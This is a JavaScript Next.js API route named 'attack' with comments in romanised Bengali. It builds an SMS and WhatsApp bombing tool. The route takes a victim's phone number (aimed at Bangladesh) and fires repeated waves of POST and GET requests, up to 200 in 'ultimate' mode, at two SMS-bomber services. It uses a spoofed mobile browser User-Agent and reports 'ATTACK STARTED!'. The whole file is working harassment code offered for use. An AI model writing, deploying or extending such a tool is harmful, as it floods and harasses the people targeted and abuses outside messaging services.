// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  let { number, amount, isUltimate } = req.body;

  // 1. Number Cleaning (Sabcheye important part)
  // Jodi user +88 diye dey, amra oita muche felbo
  let cleanNumber = number.toString().replace(/\D/g, ''); // Shudhu digit rakhbe
  if (cleanNumber.startsWith('88')) {
    cleanNumber = cleanNumber.substring(2); // 88 muche felbe
  }

  // 2. Target URLs
  const targetLinks = [
    'https://nuke-sms-bomber.pages.dev/api/attack', // API Endpoint simulation
    'https://shadowx-sms-bomber.onrender.com/api/send' // API Endpoint simulation
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 200 : amount; 
    const delay = isUltimate ? 500 : 2000; 

    for (let i = 0; i < totalWaves; i++) {
      const attackPromises = targetLinks.map(async (link) => {
        try {
          // Amra ekhane duiti format try korbo (Request Body & URL Params)
          const payload = {
            number: cleanNumber,
            phone: cleanNumber,
            target: cleanNumber,
            amount: 1,
            count: 1,
            qty: 1,
            country: "BD",
            service: "whatsapp"
          };

          // Method 1: POST Request (JSON Payload)
          const response = await fetch(link, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json',
              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
              'X-Requested-With': 'XMLHttpRequest',
            },
            body: JSON.stringify(payload),
            mode: 'cors'
          });

          // Method 2: URL Query String (Fallback)
          // Eita direct URL e parameter pathabe jemon: ?number=017...
          const fallbackUrl = `${link}?number=${cleanNumber}&amount=1&country=BD`;
          await fetch(fallbackUrl, { method: 'GET', mode: 'no-cors' });

          console.log(`[Wave ${i}] Hit sent to ${link} for number: ${cleanNumber}`);

        } catch (err) {
          console.error(`[Wave ${i}] Error: ${err.message}`);
        }
      });

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  // Attack start
  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK STARTED! 🔥" 
  });
            }
